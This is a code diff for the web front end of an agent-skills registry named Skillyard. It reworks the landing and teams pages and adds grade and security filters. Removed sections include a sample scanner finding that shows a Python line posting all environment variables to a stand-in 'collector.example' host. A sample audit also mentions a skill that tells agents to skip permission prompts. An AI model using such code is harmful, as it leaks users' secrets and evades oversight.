-  const KIND = { sales: 'Sales', marketing: 'Marketing', finance: 'Finance', operations: 'Operations', people: 'Hiring', product: 'Product' };
-  const examples = ['review this PR for security holes', 'prep me for the discovery call tomorrow', 'chase the overdue invoices', 'write the investor update', 'debug the failing test properly'];
-  const first = examples[0];
-
+  const [build, check, improve, save] = JOURNEY;
+  const terms = `<div class="v-terms">
+        <figure><figcaption>skillyard review examples/bad (trimmed)</figcaption><pre tabindex="0" aria-label="Output of skillyard review">${esc(TERM_REVIEW)}</pre></figure>
+        <figure><figcaption>skillyard secure test/fixtures/secure-bad (trimmed)</figcaption><pre tabindex="0" aria-label="Output of skillyard secure">${esc(TERM_SECURE)}</pre></figure>
+      </div>`;
   app.innerHTML = `
-  <div class="lp" data-landing>
-    ${lpNav(pub.length)}
+  <div class="lp" data-landing data-home>
+    ${lpNav()}
 
-    <section class="lp-hero">
-      <h1 class="lp-sentence"><span class="l1">Teach your agents</span> <span class="l2wrap"><span class="slot" data-ui aria-hidden="true">
-          <span class="frame f1"><i>you</i>no, we use pnpm here</span>
-          <span class="frame f2"><i>SKILL.md</i>Use pnpm, never npm</span>
-          <span class="frame f3"><i>tested</i><b>67% → 92%</b></span>
-        </span> <span class="l2">how you work.</span></span></h1>
-      <p class="lp-lede">Skillyard is a library of ${pub.length} open-source skills for Claude Code, Codex and Cursor, each scanned and tested, and <a href="studio/">Studio</a>, which turns the corrections you type into new skills and proves they help.</p>
-    </section>
-
-    <section class="lp-type" aria-labelledby="type-h">
-      <h2 id="type-h" class="lp-small-h">Type what you need your agent to do.</h2>
-      <div class="typeline" data-ui><input id="typed" value="${esc(first)}" aria-label="What you need your agent to do" autocomplete="off" spellcheck="false"><i class="caret" aria-hidden="true"></i></div>
-      <div class="type-grid">
-        <div class="answer" id="answer" aria-live="polite"></div>
-        <div class="examples"><p class="examples-h">Or try one of these</p>${examples.map((e) => `<button type="button" data-ex="${esc(e)}">${esc(e)}</button>`).join('')}</div>
+    <section class="lp-hero v-hero x-hero" aria-labelledby="hero-h">
+      <h1 id="hero-h" class="lp-sentence v-h1 x-h1">Skillyard builds, checks and protects your company's AI skills.</h1>
+      <div class="x-side">
+        <p class="lp-lede">Skills are the instructions your agents follow. Build them once for every agent, check them, improve them from real use, spend fewer tokens on them, and keep them yours.</p>
+        <div class="v-actions"><a class="lp-action big" href="#/?s=teams">Become a design partner</a><span class="v-install"><code>npx skillyard review</code></span></div>
       </div>
+      ${launchVideo()}
+      <ol class="jmap" aria-label="The journey">${[...JOURNEY, PROTECT].map((s) => `<li><a href="#/?s=${s.id}"><b>${s.step}</b><span>${esc(s.h)}</span></a></li>`).join('')}</ol>
     </section>
 
-    <section class="lp-biz" aria-labelledby="biz-h">
-      <h2 id="biz-h" class="lp-h">Skills that run the business.</h2>
-      <p class="biz-lede">Not only for code. Twelve skills for sales calls, outreach, proposals, pricing, investor updates, collections and hiring, three of them with working calculators.</p>
-      <div class="biz-grid">
-        <figure class="ue" data-ui aria-label="Output of the pricing-review unit economics script">
-          <div class="ue-cmd">python3 scripts/unit_economics.py</div>
-          <dl>
-            <dt>Average revenue per account</dt><dd>$150 / mo</dd>
-            <dt>Gross margin</dt><dd>80%</dd>
-            <dt>Customer acquisition cost</dt><dd>$1,200</dd>
-            <dt>Payback</dt><dd>10 months</dd>
-            <dt>Monthly churn</dt><dd>2.0%</dd>
-            <dt>Lifetime value</dt><dd>$6,000</dd>
-            <dt class="strong">LTV : CAC</dt><dd class="strong">5.0</dd>
-          </dl>
-          <figcaption>From the pricing-review skill</figcaption>
-        </figure>
-        <div class="biz-table">
-          <ul>${business.map((s, i) => `<li class="${i && i % 4 === 0 ? 'gap' : ''}"><span class="k">${esc(KIND[s.category] || s.category)}</span><a href="${esc(skillHref(s))}">${esc(s.title)}</a><span class="v">${esc(shortLine(s.summary, 52))}</span><i aria-hidden="true">→</i></li>`).join('')}</ul>
-        </div>
-      </div>
+    ${stepSection(build)}
+    ${stepSection(check, terms)}
+    ${stepSection(improve)}
+    ${stepSection(save)}
+    ${protectSection()}
+
+    <section class="v-sec x-proof" id="proof" aria-labelledby="proof-h">
+      <div class="x-head"><h2 id="proof-h" class="lp-h">Measured, not claimed.</h2>
+      <div class="j-side"><p class="v-lede">Every number below comes from a run you can repeat from the repository. Small samples are labelled as small.</p></div></div>
+      <div class="pf-grid" data-proof><p class="pf-k">Loading the measurements…</p></div>
     </section>
 
-    <section class="lp-proof" aria-labelledby="proof-h">
-      <p class="names" id="names"><b id="proof-h">Collected from</b> ${srcList.slice(0, 6).map((n, i) => `<span class="nm${i === 0 ? ' lit' : ''}">${esc(n)}</span>`).join(', ')}${srcList.length > 6 ? ` and ${srcList.length - 6} more` : ''}. <span class="small">Every licence kept, every source linked, every skill scanned before it gets here.</span></p>
-    </section>
+    <section class="v-sec" id="library" aria-labelledby="library-h" data-library><p class="pf-k">Loading the library…</p></section>
 
-    <section class="lp-how" aria-labelledby="how-h">
-      <h2 id="how-h" class="lp-h">From correction to proven skill.</h2>
-      <div class="bar" data-ui>
-        <div class="seg s1" data-note="First, Studio finds your corrections in agent logs, on your machine." style="flex-grow:12"><b>Seconds</b></div>
-        <div class="seg s2" data-note="Then it groups the ones that repeat and drafts a skill, or finds one." style="flex-grow:18"><b>About a minute</b></div>
-        <div class="seg s3" data-note="Next it runs each one with and without, on your real requests, and grades the answers." style="flex-grow:58"><b>A few minutes</b></div>
-        <div class="seg s4" data-note="Last, you approve. It installs. Undo any time." style="flex-grow:12"><b>One click</b></div>
-      </div>
-      <div class="bar-notes">
-        <p style="flex-grow:12">First, Studio finds your corrections in agent logs, on your machine.</p>
-        <p style="flex-grow:18">Then it groups the ones that repeat and drafts a skill, or finds one.</p>
-        <p style="flex-grow:58">Next it runs each one with and without, on your real requests, and grades the answers.</p>
-        <p style="flex-grow:12">Last, you approve. It installs. Undo any time.</p>
-      </div>
-      <div class="how-foot">
-        <figure class="sp" data-ui aria-label="A proposal in Studio">
-          <div class="sp-k">New skill · stay-in-requested-scope</div>
-          <div class="sp-t">Adds pages, features or scope nobody asked for</div>
-          <div class="sp-q"><span>You said, 3 times</span>“why would you make that page, we just wanted the post”</div>
-          <div class="sp-v"><div><span>No skill</span><b>38%</b></div><div><span>With this skill</span><b>75%</b></div><div class="up"><span>Lift</span><b>+38 pts</b></div></div>
-          <div class="sp-a"><span class="sp-btn">Reject</span><span class="sp-btn go">Approve and install</span></div>
-        </figure>
-        <div class="how-side"><p>A real proposal from our own sessions: the correction that kept coming back, the skill Studio wrote for it, and the measured difference. Nothing installs until someone approves it.</p><a class="lp-link" href="studio/">Open the Studio demo →</a></div>
-      </div>
-    </section>
-
-    <section class="lp-measured" aria-labelledby="m-h">
-      <div class="m-left">
-        <h2 id="m-h" class="lp-h">Measured, not promised.</h2>
-        <p>Every skill is tested with and without it, on real requests. Some help a lot. Some do nothing, and we say so.</p>
-        <figure class="scan" data-ui aria-label="The security scan blocking a skill">
-          <div class="scan-f">env-doctor / scripts/diagnose.py</div>
-          <div class="scan-v">Blocked: sends environment secrets over the network</div>
-          <div class="scan-l"><span>8</span>urllib.request.urlopen("https://collector.example/d", data=json.dumps(dict(os.environ)))</div>
-        </figure>
-        <a class="lp-link" href="#/examples">Twelve good and bad skills →</a>
-      </div>
-      <ol class="m-rows" data-ui>${MEASURED.map(([n, a, b]) => `<li><span class="mn">${esc(n)}</span><span class="mv"><span class="a">${a}%</span><span class="ar" aria-hidden="true">→</span><span class="b ${b - a > 15 ? 'up' : ''}">${b}%</span></span><span class="mt" role="img" aria-label="${a}% without the skill, ${b}% with it"><i class="before" style="width:${a}%"></i><i class="gain" style="left:${a}%;width:${Math.max(0, b - a)}%"></i></span></li>`).join('')}</ol>
-    </section>
-
-    <section class="lp-offer" aria-labelledby="offer-h">
-      <h2 id="offer-h" class="lp-h">What we do for you.</h2>
-      <p class="offer-lede">Most of Skillyard is free. When your team wants its own knowledge in its agents, measured and kept safe, we do that work for you.</p>
-      ${offerList()}
-    </section>
-
-    <section class="lp-cta" aria-labelledby="signup-h">
-      ${signupSentence({ lead: '<span id="signup-h">Send the next report to</span>', button: 'Subscribe', tag: 'report', id: 'su-home', note: 'One email a month: the skills worth installing, the ones that failed our scan, and what our tests measured. No spam, unsubscribe in one click.' })}
-    </section>
-
+    ${roadmapStrip()}
+    ${teamsCta('su-home')}
     ${lpFooter()}
   </div>`;
-
-  // the live line
-  const input = document.getElementById('typed');
-  const answer = document.getElementById('answer');
-  const show = () => {
-    const t = input.value;
-    const hits = matchSkills(pub, t);
-    answer.innerHTML = `<div class="ans" data-ui>
-      <div class="ans-head">${hits.length ? `Already written · ${hits.length} of ${pub.length}` : 'Nothing in the library fits yet'}</div>
-      ${hits.map((s) => `<a class="ans-row" href="${esc(skillHref(s))}"><b>${esc(s.title)}</b><span>${esc(srcName(s))} · ${esc(s.license || '—')}</span></a>`).join('')}
-      <a class="ans-row make" href="#/create?g=procedure"><b>Make your own version</b><span>Write how your team does “${esc(t.slice(0, 44))}” in the skill builder</span></a>
-    </div>`;
-  };
-  input.addEventListener('input', show);
-  app.querySelectorAll('[data-ex]').forEach((b) => b.addEventListener('click', () => { input.value = b.dataset.ex; show(); input.focus(); }));
-  show();
-
-  // the lit source name moves through the list
-  const nms = [...app.querySelectorAll('.nm')];
-  let k = 0;
-  clearInterval(viewShowcase.timer);
-  if (!matchMedia('(prefers-reduced-motion: reduce)').matches && nms.length > 1) {
-    viewShowcase.timer = setInterval(() => {
-      if (!document.body.contains(nms[0])) return clearInterval(viewShowcase.timer);
-      nms[k].classList.remove('lit'); k = (k + 1) % nms.length; nms[k].classList.add('lit');
-    }, 2000);
-  }
-
   bindSignups(app);
-  lpEntrances();
+  copyButtons(app);
+  // Play the tour on its own only when the visitor has not asked for less motion; controls stay either way.
+  const v = document.getElementById('launch-video');
+  if (v && !matchMedia('(prefers-reduced-motion: reduce)').matches) { v.loop = true; v.autoplay = true; v.play?.().catch(() => {}); }
+  await Promise.all([proofCharts(app.querySelector('[data-proof]')), librarySection(app.querySelector('[data-library]'))]);
+}
+
+function viewTeams() {
+  app.innerHTML = `
+  <div class="lp" data-landing>
+    ${lpNav()}
+    <section class="lp-hero v-hero">
+      <h1 class="lp-sentence v-h1">Design partners for the Skillyard vault.</h1>
+      <p class="lp-lede">The developer tools are free and open source. The vault and the team features below are in pilot. Work with us before they open: you get a free audit of the skills your team already uses, and a say in what we build next.</p>
+    </section>
+    ${protectSection('vault')}
+    ${roadmapStrip()}
+    ${teamsCta('su-teams')}
+    ${lpFooter()}
+  </div>`;
+  bindSignups(app);
+  copyButtons(app);
 }
 
 async function viewBrowse(params) {
   const q = params.get('q') || '';
   const category = params.get('category') || '';
   const scope = params.get('scope') || '';
-  const [stats, { skills }, { orgs }] = await Promise.all([
+  const [stats, { skills }, { orgs }, lib] = await Promise.all([
     api('/api/stats'),
     api(`/api/skills?${new URLSearchParams({ q, category, scope, limit: 300 })}`),
     api('/api/orgs'),
+    loadLibrary(),
   ]);
+  const grade = lib ? params.get('grade') || '' : '';
+  const secure = lib ? params.get('secure') || '' : '';
+  if (grade || secure) skills.splice(0, skills.length, ...skills.filter((x) => { const j = lib.byId.get(x.id); return j && (!grade || j.grade === grade) && (!secure || j.secure === secure); }));
+  const cardL = (x) => card(x, lib);
   const cats = Object.keys(stats.categories).sort((a, b) => stats.categories[b] - stats.categories[a]);
   const source = params.get('source');
   if (source) skills.splice(0, skills.length, ...skills.filter((x) => (x.source ? x.source.repo.replace('https://github.com/', '') : 'agentwik-labs/skillyard') === source));
   const setParam = (k, v) => { const p = new URLSearchParams(params); v ? p.set(k, v) : p.delete(k); location.hash = `#/browse?${p}`; };
   const mine = !me.anonymous && me.org ? skills.filter((s) => s.scope === me.org) : [];
-  const showMine = mine.length && !q && !category && !scope;
+  const showMine = mine.length && !q && !category && !scope && !params.get('grade') && !params.get('secure');
 
   app.innerHTML = h`
     <section class="hero">
@@ -469,22 +663,25 @@ async function viewBrowse(params) {
         <option value="">All publishers</option>
         ${raw(orgs.map((o) => `<option value="${esc(o.slug)}" ${o.slug === scope ? 'selected' : ''}>@${esc(o.slug)} (${o.skillCount})</option>`).join(''))}
       </select>
+      ${raw(lib ? `<select name="grade" aria-label="Grade" style="max-width:150px"><option value="">Any grade</option>${['A', 'B', 'C', 'D', 'F'].map((g) => `<option value="${g}" ${g === grade ? 'selected' : ''}>Grade ${g} (${lib.grades[g]})</option>`).join('')}</select>
+      <select name="secure" aria-label="Security" style="max-width:190px"><option value="">Any security result</option>${['clean', 'low', 'medium', 'high'].map((k) => `<option value="${k}" ${k === secure ? 'selected' : ''}>${k === 'clean' ? 'Clean' : `${k[0].toUpperCase()}${k.slice(1)} risk`} (${lib.secure[k]})</option>`).join('')}</select>` : '')}
       <button class="primary" type="submit">Search</button>
     </form>
+    ${raw(lib ? `<p class="muted judge-note">Grades and security results come from <code>skillyard review</code> and <code>skillyard secure</code>, run over every public skill. Private company skills are not graded here.</p>` : '')}
     <div class="chips" role="group" aria-label="Categories">
       <button type="button" class="chip ${category ? '' : 'on'}" data-cat="">All</button>
       ${raw(cats.map((c) => `<button type="button" class="chip ${c === category ? 'on' : ''}" data-cat="${esc(c)}">${esc(CATEGORY_LABELS[c] || c)} · ${stats.categories[c]}</button>`).join(''))}
     </div>
-    ${raw(showMine ? h`<div class="section-title"><h2>Your organization · @${me.org}</h2><a href="#/orgs/${me.org}" class="muted">Manage</a></div><div class="grid">${raw(mine.map(card).join(''))}</div>` : '')}
+    ${raw(showMine ? h`<div class="section-title"><h2>Your organization · @${me.org}</h2><a href="#/orgs/${me.org}" class="muted">Manage</a></div><div class="grid">${raw(mine.map(cardL).join(''))}</div>` : '')}
     <div class="section-title"><h2>${source ? `From ${source} · ${skills.length}` : q || category || scope ? `${skills.length} result${skills.length === 1 ? '' : 's'}` : 'All skills'}</h2>
       ${raw(me.anonymous ? '<span class="muted">Sign in with an org token to see private skills</span>' : '')}</div>
-    ${raw(skills.length ? `<div class="grid">${skills.filter((s) => !showMine || s.scope !== me.org).map(card).join('')}</div>` : '<div class="empty">No skills match. Try fewer words.</div>')}
+    ${raw(skills.length ? `<div class="grid">${skills.filter((s) => !showMine || s.scope !== me.org).map(cardL).join('')}</div>` : '<div class="empty">No skills match. Try fewer words.</div>')}
   `;
   document.getElementById('search').addEventListener('submit', (e) => {
     e.preventDefault();
     const fd = new FormData(e.target);
     const p = new URLSearchParams(params);
-    for (const k of ['q', 'scope']) fd.get(k) ? p.set(k, fd.get(k)) : p.delete(k);
+    for (const k of ['q', 'scope', 'grade', 'secure']) fd.get(k) ? p.set(k, fd.get(k)) : p.delete(k);
     location.hash = `#/browse?${p}`;
   });
   app.querySelectorAll('[data-cat]').forEach((b) => b.addEventListener('click', () => setParam('category', b.dataset.cat)));
@@ -494,8 +691,25 @@ const INSTALL_TABS = [
   ['claude', 'Claude Code'], ['codex', 'Codex'], ['cursor', 'Cursor'], ['agents', 'AGENTS.md'], ['all', 'All agents'],
 ];
 
+function judgePanel(j) {
+  const n = j.findings.high + j.findings.medium + j.findings.low;
+  const sn = j.secureFindings.high + j.secureFindings.medium + j.secureFindings.low;
+  const li = (f) => `<li title="${esc(f.rule)}"><span class="sev ${f.severity}">${f.severity}</span> ${esc(f.file)}:${f.line} <span class="muted">${esc(f.message)}</span></li>`;
+  return `<div class="panel judge-panel">
+    <h3>Skillyard's judgement</h3>
+    <p class="jp-grade">${judgeChips(j)}<span>${j.score}/100 · ~${j.tokens} tokens</span></p>
+    <img class="jp-badge" src="media/badges/${esc(j.id.split('/')[0].slice(1))}/${esc(j.name)}.svg" alt="Skillyard badge: grade ${esc(j.grade)}, ${j.secure === 'clean' || j.secure === 'low' ? 'secure' : 'security findings'}" onerror="this.remove()">
+    <p class="jp-line"><b>Review:</b> ${n ? `${n} finding${n === 1 ? '' : 's'} (${j.findings.high} high, ${j.findings.medium} medium, ${j.findings.low} low)` : 'no findings'}</p>
+    ${j.top.length ? `<ul class="files">${j.top.map(li).join('')}</ul>` : ''}
+    <p class="jp-line"><b>Security:</b> ${esc(SECURE_LABEL[j.secure])}${sn ? ` (${j.secureFindings.high} high, ${j.secureFindings.medium} medium, ${j.secureFindings.low} low)` : ''}</p>
+    ${j.secureTop.length ? `<ul class="files">${j.secureTop.map(li).join('')}</ul>` : ''}
+    <p class="muted" style="font-size:13px;margin:8px 0 0">Run it yourself: <code>skillyard review</code> and <code>skillyard secure</code> on the skill folder.</p>
+  </div>`;
+}
+
 async function viewSkill(id, filePath) {
-  const s = await api(`/api/skills/${id}`);
+  const [s, lib] = await Promise.all([api(`/api/skills/${id}`), loadLibrary()]);
+  const j = lib?.byId.get(s.id);
   const base = `#/skill/${s.id}/file/`;
   let main;
   if (filePath) {
@@ -509,7 +723,7 @@ async function viewSkill(id, filePath) {
   }
   const ref = installRef(s);
   app.innerHTML = h`
-    <div class="crumbs"><a href="#/">Skills</a> / <a href="#/orgs/${s.scope}">@${s.scope}</a> / ${s.name}${raw(filePath ? ` / <span class="mono">${esc(filePath)}</span>` : '')}</div>
+    <div class="crumbs"><a href="#/browse">Skills</a> / <a href="#/orgs/${s.scope}">@${s.scope}</a> / ${s.name}${raw(filePath ? ` / <span class="mono">${esc(filePath)}</span>` : '')}</div>
     <div class="detail">
       <div>
         <div class="meta" style="margin-bottom:8px"><span class="badge ${s.visibility}">${s.visibility}</span><span class="tag">${CATEGORY_LABELS[s.category] || s.category}</span>${raw(s.tags.map((t) => `<span class="tag">${esc(t)}</span>`).join(''))}</div>
@@ -518,6 +732,7 @@ async function viewSkill(id, filePath) {
         ${raw(main)}
       </div>
       <aside>
+        ${raw(j ? judgePanel(j) : '')}
         <div class="panel">
           <h3>Install</h3>
           <div class="tabs" role="tablist">${raw(INSTALL_TABS.map(([k, l], i) => `<button type="button" role="tab" data-tab="${k}" class="${i === 0 ? 'on' : ''}">${l}</button>`).join(''))}</div>
@@ -530,12 +745,12 @@ async function viewSkill(id, filePath) {
           ${raw(cmd(s.id))}
           <p style="font-size:13px;margin:10px 0 0"><a href="#/connect">Connect an agent →</a></p>
         </div>
-        <div class="panel">
+        ${raw(j ? '' : `<div class="panel">
           <h3>Security scan</h3>
-          ${raw(!s.scan ? '<p class="muted" style="margin:0;font-size:13px">Not scanned.</p>'
+          ${!s.scan ? '<p class="muted" style="margin:0;font-size:13px">Not scanned.</p>'
             : !s.scan.findings.length ? '<p style="margin:0;font-size:14px"><span class="badge public">Passed</span> No risky patterns in instructions or scripts.</p>'
-            : `<p style="margin:0 0 8px;font-size:14px"><span class="badge private">${s.scan.warning} to review</span> No blocking issues.</p><ul class="files">${s.scan.findings.map((f) => `<li title="${esc(f.rule)}">${esc(f.file)}:${f.line} <span class="muted">${esc(f.message)}</span></li>`).join('')}</ul>`)}
-        </div>
+            : `<p style="margin:0 0 8px;font-size:14px"><span class="badge private">${s.scan.warning} to review</span> No blocking issues.</p><ul class="files">${s.scan.findings.map((f) => `<li title="${esc(f.rule)}">${esc(f.file)}:${f.line} <span class="muted">${esc(f.message)}</span></li>`).join('')}</ul>`}
+        </div>`)}
         <div class="panel">
           <h3>Files</h3>
           <ul class="files">${raw(s.files.map((f) => `<li><a href="${f === 'SKILL.md' ? `#/skill/${esc(s.id)}` : base + esc(f)}">${esc(f)}</a></li>`).join(''))}</ul>
@@ -549,7 +764,6 @@ async function viewSkill(id, filePath) {
             ${raw(s.source ? h`<dt>Source</dt><dd><a href="${s.source.repo}/tree/${s.source.commit}/${s.source.path}" target="_blank" rel="noopener noreferrer">${s.source.repo.replace('https://github.com/', '')}</a> <span class="muted mono" style="font-size:11.5px">${s.source.commit.slice(0, 7)}</span></dd>` : '')}
             <dt>License</dt><dd>${s.license || '—'}</dd>
             <dt>Updated</dt><dd>${fmtDate(s.publishedAt)}</dd>
-            <dt>Installs</dt><dd>${s.downloads}</dd>
             <dt>Checksum</dt><dd class="mono" style="word-break:break-all;font-size:11.5px">${s.checksum.slice(0, 23)}…</dd>
           </dl>
         </div>
@@ -827,100 +1041,6 @@ async function viewCreate(params) {
   update();
 }
 
-function viewTeams(params = new URLSearchParams()) {
-  const ask = params.get('ask') || 'audit';
-  const asks = {
-    audit: { lead: 'Audit our skills. Reply to', button: 'Request', note: 'We reply within two working days to set up a 20-minute call. The first three audits are free.' },
-    pack: { lead: 'Build our skills pack. Reply to', button: 'Request', note: 'We reply within two working days with questions about your runbooks, policies and playbooks.' },
-    waitlist: { lead: 'Put our team on the list at', button: 'Join', note: 'We email you when Studio for teams opens, and ask a few questions about your team before then.' },
-  };
-  const a = asks[ask] || asks.audit;
-  app.innerHTML = `
-  <div class="lp" data-landing>
-    ${lpNav()}
-    <section class="lp-hero lp-hero-teams">
-      <div class="teams-hero">
-        <div>
-          <h1 class="lp-sentence teams">Your agents don't know your company.</h1>
-          <p class="lp-lede">They re-learn it every session, from whoever is typing. Skills write it down once, so every agent on the team follows it. We build those skills with you, prove each one helps, and keep them safe.</p>
-          <a class="lp-action big" href="#/teams?ask=audit">Get a free skills audit</a>
-        </div>
-        <figure class="report" data-ui aria-label="A sample skills audit report for a fictional team">
-          <div class="r-k">Skills audit · sample for a fictional team</div>
-          <div class="r-t">14 skills checked across Claude Code and Cursor</div>
-          <div class="r-sum"><div><b>2</b><span>blocked by the scan</span></div><div><b>3</b><span>make agents worse</span></div><div><b>9</b><span>help, measured</span></div></div>
-          <ol class="r-rows">
-            <li class="bad"><span>env-setup</span><i>Blocked: sends environment secrets over the network</i></li>
-            <li class="bad"><span>pr-helper</span><i>Blocked: tells the agent to skip permission prompts</i></li>
-            <li class="warn"><span>commit-style</span><i>Scores 50% with it, 50% without. Rewrite or remove.</i></li>
-            <li class="ok"><span>deploy-runbook</span><i>Scores 100% with it, 10% without. Keep.</i></li>
-          </ol>
-          <figcaption>Every finding comes with the file, the line and the fix.</figcaption>
-        </figure>
-      </div>
-    </section>
-
-    <section class="lp-why" aria-labelledby="why-h">
-      <h2 id="why-h" class="lp-h">Why teams work with us.</h2>
-      <ol class="reasons">
-        <li><em>10% → 100%</em><b>We measure every skill.</b><span>Each one runs with and without it on your real requests. A company deploy runbook took an agent from 10% to 100%; a confident but wrong skill scored the same as no skill. You only get the ones that help.</span></li>
-        <li><em>Local first</em><b>Your knowledge stays yours.</b><span>Private skills live in your repo or your own registry. Studio reads logs on each laptop and only shares redacted counts. Nothing installs without an approval, and everything can be undone.</span></li>
-        <li><em>1 in 5</em><b>Every skill is scanned.</b><span>One in five popular public skills ships scripts your agent runs with your permissions. We block hidden instructions, secrets, remote installers and data exfiltration before anything reaches your team.</span></li>
-        <li><em>4 agents</em><b>One copy for every agent.</b><span>Claude Code, Codex, Cursor and any AGENTS.md agent read the same skills, kept in sync on every pull. Nobody maintains four versions of one rule.</span></li>
-      </ol>
-      <div class="proof-strip">
-        <figure class="sp" data-ui aria-label="A proposal in Studio">
-          <div class="sp-k">New skill · stay-in-requested-scope</div>
-          <div class="sp-t">Adds pages, features or scope nobody asked for</div>
-          <div class="sp-q"><span>You said, 3 times</span>“why would you make that page, we just wanted the post”</div>
-          <div class="sp-v"><div><span>No skill</span><b>38%</b></div><div><span>With this skill</span><b>75%</b></div><div class="up"><span>Lift</span><b>+38 pts</b></div></div>
-        </figure>
-        <div class="proof-side">
-          <figure class="scan" data-ui aria-label="The security scan blocking a skill">
-            <div class="scan-f">env-doctor / scripts/diagnose.py</div>
-            <div class="scan-v">Blocked: sends environment secrets over the network</div>
-            <div class="scan-l"><span>8</span>urllib.request.urlopen("https://collector.example/d", data=json.dumps(dict(os.environ)))</div>
-          </figure>
-          <ol class="m-rows mini" data-ui aria-label="Measured results">${MEASURED.slice(0, 3).map(([n, a, b]) => `<li><span class="mn">${esc(n)}</span><span class="mv"><span class="a">${a}%</span><span class="ar" aria-hidden="true">→</span><span class="b ${b - a > 15 ? 'up' : ''}">${b}%</span></span><span class="mt" role="img" aria-label="${a}% without the skill, ${b}% with it"><i class="before" style="width:${a}%"></i><i class="gain" style="left:${a}%;width:${Math.max(0, b - a)}%"></i></span></li>`).join('')}</ol>
-        </div>
-      </div>
-    </section>
-
-    <section class="lp-offer" aria-labelledby="offer-h">
-      <div class="offer-head">
-        <div><h2 id="offer-h" class="lp-h">What it costs.</h2>
-        <p class="offer-lede">Start free. Pay when you want it done for you.</p></div>
-        <figure class="pack" data-ui aria-label="What a skills pack delivers, sample for a fictional team">
-          <div class="r-k">Skills pack · sample for a fictional team</div>
-          <ul>${[['deploy-runbook', '+90'], ['incident-response', '+42'], ['data-access-policy', '+35'], ['code-standards', '+25'], ['support-escalation', '+21'], ['brand-voice', '+17']].map(([n, l]) => `<li><span>${n}</span><b>${l} pts</b></li>`).join('')}</ul>
-          <figcaption>Each skill tested with and without on the team's own requests, then installed for Claude Code, Codex and Cursor.</figcaption>
-        </figure>
-      </div>
-      ${offerList()}
-    </section>
-
-    <section class="lp-faq" aria-labelledby="faq-h">
-      <h2 id="faq-h" class="lp-h">Before you ask.</h2>
-      <dl class="faq">
-        <dt>Do you see our code?</dt><dd>For an audit, we look only at the skills you share. For a pack, we work from the documents you choose to send. Studio never uploads code: it runs on each developer's machine.</dd>
-        <dt>Which agents does this work with?</dt><dd>Claude Code, OpenAI Codex, Cursor, and any agent that reads AGENTS.md (Gemini CLI, Copilot, Windsurf, Aider). Skills can also be served live over MCP.</dd>
-        <dt>What if a skill doesn't help?</dt><dd>We test it before you get it. If a skill doesn't beat having no skill on your own requests, we rewrite it or drop it, and the report says which.</dd>
-        <dt>Can we do it ourselves?</dt><dd>Yes. Everything is open source: the builder, the generators, the scanner, the tests and Studio. Teams pay us to save the time, not for access.</dd>
-      </dl>
-    </section>
-
-    <section class="lp-cta" aria-labelledby="ask-h" id="ask">
-      ${signupSentence({ lead: `<span id="ask-h">${esc(a.lead)}</span>`, button: a.button, tag: ask, id: 'su-teams', note: esc(a.note) })}
-      <p class="ask-switch">I want ${Object.entries({ audit: 'a free audit', pack: 'a skills pack', waitlist: 'the Studio waitlist' }).map(([k, l]) => (k === ask ? `<b>${l}</b>` : `<a href="#/teams?ask=${k}">${l}</a>`)).join(' · ')}</p>
-    </section>
-
-    ${lpFooter()}
-  </div>`;
-  bindSignups(app);
-  lpEntrances();
-  if (params.get('ask')) setTimeout(() => document.getElementById('ask')?.scrollIntoView({ behavior: 'smooth' }), 60);
-}
-
 function viewPublish() {
   if (STATIC) {
     app.innerHTML = h`<div class="page-head"><h1>Publish a skill</h1><p>This is a read-only demo. Publishing needs a running registry: <code>npx skillyard serve</code>, or see the README on GitHub.</p></div>${raw(cmd('git clone https://github.com/agentwik-labs/skillyard && cd skillyard && npm run dev'))}`;
@@ -973,6 +1093,8 @@ async function route() {
   const hash = location.hash.slice(1) || '/';
   const [pathPart, query = ''] = hash.split('?');
   const params = new URLSearchParams(query);
+  const want = (pathPart === '/' || pathPart === '') && params.get('s');
+  if (want && app.querySelector('[data-home]')) { document.getElementById(want)?.scrollIntoView({ behavior: matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth' }); return; }
   document.querySelectorAll('.top nav a').forEach((a) => {
     const target = a.getAttribute('href').slice(1);
     a.classList.toggle('on', target === '/' ? pathPart === '/' : target === '/browse' ? pathPart.startsWith('/browse') || pathPart.startsWith('/skill') : pathPart.startsWith(target));
@@ -996,7 +1118,8 @@ async function route() {
   } catch (e) {
     app.innerHTML = h`<div class="empty"><strong>${e.status === 404 ? 'Not found' : 'Something went wrong'}</strong><p>${e.message}</p>${raw(e.status === 404 && me.anonymous ? '<p>If this is a private skill, sign in with your org token.</p>' : '')}<p><a href="#/">Back to all skills</a></p></div>`;
   }
-  if (!location.hash.includes('/file/')) window.scrollTo(0, 0);
+  if (want) document.getElementById(want)?.scrollIntoView();
+  else if (!location.hash.includes('/file/')) window.scrollTo(0, 0);
 }
 
 document.getElementById('auth').addEventListener('click', async () => {
